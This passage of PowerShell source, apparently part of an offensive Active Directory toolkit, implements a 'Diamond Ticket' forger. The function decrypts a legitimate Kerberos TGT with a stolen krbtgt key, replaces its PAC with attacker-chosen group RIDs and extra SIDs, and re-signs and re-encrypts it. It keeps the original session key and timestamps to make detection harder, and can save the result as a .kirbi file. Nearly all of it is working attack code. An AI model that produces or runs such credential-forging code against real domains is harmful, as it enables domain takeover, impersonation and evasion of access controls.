        If specified, the ticket will be forged for this user instead.

    .PARAMETER BaseUserTGT
        The raw bytes of a legitimate TGT (KRB-CRED/.kirbi format).

    .PARAMETER Key
        The krbtgt key bytes for decrypting/encrypting the ticket.

    .PARAMETER GroupRIDs
        Group RIDs for the new PAC (replaces original groups).

    .PARAMETER ExtraSIDs
        Extra SIDs to add to the PAC.

    .NOTES
        Requirements:
        - A legitimate TGT (can be obtained via Invoke-KerberosAuth or from memory)
        - The krbtgt key (NT-Hash or AES key matching encryption type)
    #>
    [CmdletBinding()]
    param(
        [string]$UserName,
        [string]$Domain,
        [string]$DomainSID,
        [uint32]$UserRID,
        [byte[]]$Key,
        [int]$EncryptionType,
        [byte[]]$BaseUserTGT,
        [uint32[]]$GroupRIDs,
        [string[]]$ExtraSIDs,
        [int]$Kvno,
        [string]$OutputKirbi
    )

    Write-Log "[New-DiamondTicket] Building Diamond Ticket (Hybrid: TGT + Golden rebuild)..."

    try {
        # ============================================
        # PHASE 1: Extract information from base TGT
        # ============================================

        Write-Log "[New-DiamondTicket] Phase 1: Parsing base TGT..."
        $krbCred = Read-KRBCred -KirbiBytes $BaseUserTGT

        if (-not $krbCred -or -not $krbCred.TicketEncPart) {
            throw "Failed to parse base TGT or no encrypted ticket part found"
        }

        Write-Log "[New-DiamondTicket] Base TGT: $($krbCred.ClientName)@$($krbCred.ClientRealm)"

        # Use ticket's kvno for consistency
        $originalKvno = $krbCred.TicketKvno
        if ($Kvno -ne $originalKvno) {
            Write-Log "[New-DiamondTicket] Using ticket kvno ($originalKvno) instead of provided kvno ($Kvno)"
            $Kvno = $originalKvno
        }

        # Validate that the provided key type matches the ticket's encryption type
        $ticketEType = $krbCred.TicketEType
        $etypeNames = @{ 17 = "AES128-CTS"; 18 = "AES256-CTS"; 23 = "RC4-HMAC" }
        $ticketETypeName = if ($etypeNames.ContainsKey($ticketEType)) { $etypeNames[$ticketEType] } else { "etype $ticketEType" }
        $providedETypeName = if ($etypeNames.ContainsKey($EncryptionType)) { $etypeNames[$EncryptionType] } else { "etype $EncryptionType" }

        if ($ticketEType -ne 0 -and $ticketEType -ne $EncryptionType) {
            throw ("Encryption type mismatch: The base TGT is encrypted with $ticketETypeName (etype $ticketEType) " +
                "but the provided krbtgt key is $providedETypeName (etype $EncryptionType). " +
                "You need the krbtgt $ticketETypeName key to decrypt this ticket. " +
                "Alternatively, request a new TGT with forced RC4 encryption using -BaseUserNTHash (if the DC allows etype downgrade).")
        }

        Write-Log "[New-DiamondTicket] Ticket etype ($ticketETypeName) matches provided key"

        # Decrypt to extract PAC info
        Write-Log "[New-DiamondTicket] Decrypting EncTicketPart..."
        $keyUsage = 2
        $decryptedTicketPart = Unprotect-KerberosNative -Key $Key -CipherText $krbCred.TicketEncPart `
            -KeyUsage $keyUsage -EncryptionType $EncryptionType

        if (-not $decryptedTicketPart -or $decryptedTicketPart.Length -lt 10) {
            throw "Failed to decrypt EncTicketPart - wrong key or encryption type?"
        }

        # Parse EncTicketPart to get session key and timestamps
        $encTicketPart = Read-EncTicketPart -EncTicketPartBytes $decryptedTicketPart
        if (-not $encTicketPart -or -not $encTicketPart.SessionKey) {
            throw "Failed to parse EncTicketPart or no session key found"
        }

        # Extract session key from original ticket (CRITICAL: preserve for KRB-CRED)
        $sessionKey = $encTicketPart.SessionKey
        $sessionKeyType = $encTicketPart.SessionKeyType
        Write-Log "[New-DiamondTicket] Original session key: $($sessionKey.Length) bytes, etype $sessionKeyType"

        # Parse PAC to get user/domain info
        $parsedPAC = $null
        if ($encTicketPart.PAC -and $encTicketPart.PAC.Length -gt 10) {
            $parsedPAC = Read-PAC -PACData $encTicketPart.PAC
            if ($parsedPAC) {
                Write-Log "[New-DiamondTicket] Original PAC: User=$($parsedPAC.UserName), Groups=$($parsedPAC.GroupRIDs -join ',')"

                # Use PAC data as fallback for missing parameters
                if (-not $Domain) { $Domain = $parsedPAC.Domain }
                if (-not $DomainSID) { $DomainSID = $parsedPAC.DomainSID }
                if (-not $UserRID -or $UserRID -eq 0) { $UserRID = $parsedPAC.UserRID }
            }
        }

        # Use KRB-CRED client name as fallback
        if (-not $UserName) { $UserName = $krbCred.ClientName }
        if (-not $Domain) { $Domain = $krbCred.ClientRealm }

        # Preserve original timestamps from ticket
        $authTime = $encTicketPart.AuthTime
        $startTime = $encTicketPart.StartTime
        $endTime = $encTicketPart.EndTime
        $renewTill = $encTicketPart.RenewTill
        $ticketFlags = $encTicketPart.Flags
        # Note: $ticketFlags can be 0 (valid, all flags off), so check for $null explicitly
        if ($null -eq $ticketFlags) {
            $ticketFlags = New-TicketFlags -Forwardable -Renewable -Initial -PreAuthent
        }

        Write-Log "[New-DiamondTicket] Extracted: User=$UserName, Domain=$Domain, SID=$DomainSID, RID=$UserRID"
        Write-Log "[New-DiamondTicket] Timestamps: Auth=$authTime, Start=$startTime, End=$endTime"

        # ============================================
        # PHASE 2: Rebuild using Golden Ticket logic
        # ============================================

        Write-Log "[New-DiamondTicket] Phase 2: Rebuilding with Golden Ticket implementation..."

        # Parse domain info (same as Golden Ticket)
        $domainNetBIOS = $Domain.Split('.')[0].ToUpper()
        $domainFQDN = $Domain.ToUpper()
        $domainLower = $Domain.ToLower()

        Write-Log "[New-DiamondTicket] Target: $UserName (RID $UserRID), Groups: $($GroupRIDs -join ', ')"

        # Build PAC using Golden Ticket's Build-PAC (proven to work)
        Write-Log "[New-DiamondTicket] Building new PAC with requested groups..."

        # CRITICAL: AuthTime must be truncated to second precision for CLIENT_INFO match
        $authTimeRounded = [datetime]::new($authTime.Year, $authTime.Month, $authTime.Day,
            $authTime.Hour, $authTime.Minute, $authTime.Second, [System.DateTimeKind]::Utc)

        $pacResult = Build-PAC -UserName $UserName -Domain $domainNetBIOS `
            -DnsDomainName $Domain -DomainSID $DomainSID -UserRID $UserRID `
            -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
            -EncryptionType $EncryptionType -LogonTime $authTimeRounded -AuthTime $authTimeRounded

        $pacData = Complete-PACSignatures -PACData $pacResult.PACData `
            -ServerChecksumOffset $pacResult.ServerChecksumOffset `
            -KDCChecksumOffset $pacResult.KDCChecksumOffset `
            -Key $Key -EncryptionType $EncryptionType

        Write-Log "[New-DiamondTicket] New PAC: $($pacData.Length) bytes"

        # Build new EncTicketPart with new PAC but original session key and timestamps
        $newEncTicketPart = New-EncTicketPart -SessionKey $sessionKey -SessionKeyType $sessionKeyType `
            -ClientRealm $domainFQDN -ClientName $UserName `
            -AuthTime $authTimeRounded -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
            -PACData $pacData -TicketFlags $ticketFlags

        # Encrypt with krbtgt key
        $encryptedTicketPart = Protect-KerberosNative -Key $Key -Data $newEncTicketPart `
            -KeyUsage $keyUsage -EncryptionType $EncryptionType

        Write-Log "[New-DiamondTicket] Encrypted EncTicketPart: $($encryptedTicketPart.Length) bytes"

        # Build Ticket (same as Golden)
        $ticket = New-KerberosTicket -Realm $domainFQDN -ServerName "krbtgt" `
            -ServerInstance $domainLower -EncryptedPart $encryptedTicketPart `
            -EncryptionType $EncryptionType -Kvno $kvno

        # Build KRB-CRED with ORIGINAL session key (critical for TGS-REQ to work)
        $newKrbCred = Build-KRBCred -Ticket $ticket -SessionKey $sessionKey `
            -SessionKeyType $sessionKeyType -Realm $domainFQDN -ClientName $UserName `
            -ServerName "krbtgt" -ServerInstance $domainLower `
            -AuthTime $authTimeRounded -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
            -TicketFlags $ticketFlags

        Write-Log "[New-DiamondTicket] KRB-CRED: $($newKrbCred.Length) bytes"

        # Save if requested
        $outputPath = $null
        if ($OutputKirbi) {
            $outputPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutputKirbi)
            [System.IO.File]::WriteAllBytes($outputPath, $newKrbCred)
            Write-Log "[New-DiamondTicket] Saved to: $outputPath"
        }

        Write-Log "[New-DiamondTicket] Diamond Ticket created successfully (Hybrid approach)"

        return [PSCustomObject]@{
            Success = $true
            Mode = 'Diamond'
            UserName = $UserName
            Domain = $domainFQDN
            DomainSID = $DomainSID
            UserRID = $UserRID
            OriginalGroups = if ($parsedPAC) { $parsedPAC.GroupRIDs } else { @() }
            AddedGroups = $GroupRIDs
            GroupRIDs = $GroupRIDs
            ExtraSIDs = $ExtraSIDs
            EncryptionType = $EncryptionType
            EncryptionTypeName = switch ($EncryptionType) { 17 { "AES128-CTS" } 18 { "AES256-CTS" } 23 { "RC4-HMAC" } }
            Kvno = $Kvno
            AuthTime = $authTimeRounded
            StartTime = $startTime
            EndTime = $endTime
            RenewTill = $renewTill
            TicketBytes = $ticket
            KirbiBytes = $newKrbCred
            SessionKey = $sessionKey
            SessionKeyBase64 = [Convert]::ToBase64String($sessionKey)
            KirbiBase64 = [Convert]::ToBase64String($newKrbCred)
            OutputPath = $outputPath
            Message = "Diamond Ticket created (Hybrid: TGT extracted, rebuilt with Golden implementation)"
        }
    }
    catch {
        Write-Log "[New-DiamondTicket] Error: $_" -Level Error
        return [PSCustomObject]@{
            Success = $false
            Mode = 'Diamond'
            UserName = $UserName
            Domain = $Domain
            Error = $_.Exception.Message
            Message = "Diamond Ticket creation failed: $($_.Exception.Message)"
        }
    }
}
